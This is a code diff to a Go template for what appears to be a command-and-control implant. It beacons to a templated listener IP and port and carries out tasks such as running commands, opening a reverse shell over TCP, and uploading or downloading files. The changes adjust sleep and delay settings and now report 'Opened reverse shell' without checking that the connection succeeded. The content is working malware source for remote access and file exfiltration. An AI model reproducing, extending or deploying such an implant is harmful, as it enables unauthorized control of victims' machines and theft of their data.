@@ -31,11 +31,12 @@ type Task struct {
 	Device      int                    `json:"device"`
 }
 var name = ""
-var STAGER = {{stager.id}}
+var STAGER int = {{stager.id}}
 var LISTENER_IP = "{{stager.listener.address}}"
 var LISTENER_PORT = "{{stager.listener.port}}"
 var URL = "http://" + LISTENER_IP + ":" + LISTENER_PORT
-var sleep_time int = {{stager.sleep_time}}
+var sleep_time int = {{stager.options["sleep-time"]}}
+var delay int = {{stager.delay}}
 var output = ""
 var success = false
 
@@ -89,16 +90,10 @@ func run_command(command string){
 func reverse_shell(address string, port string){
 	conn, err := net.Dial("tcp", address+":"+port)
 
-	if err != nil {
-		output, success = "Could not connect.", false
-		return
-	} else {
-		output, success = "Opened reverse shell.", true
-	}
 	for {
  
 	   message, err := bufio.NewReader(conn).ReadString('\n')
- 
+	   
 	   if err != nil {
 		  return
 	   }
@@ -237,6 +232,7 @@ func main() {
 				run_command("ls " + task.Args["dir"].(string))
 			case "reverse-shell":
 				go reverse_shell(task.Args["address"].(string), task.Args["port"].(string))
+				output, success = "Opened reverse shell.", true
 			case "download":
 				upload_file(task.Args["target_path"].(string))
 			case "upload":
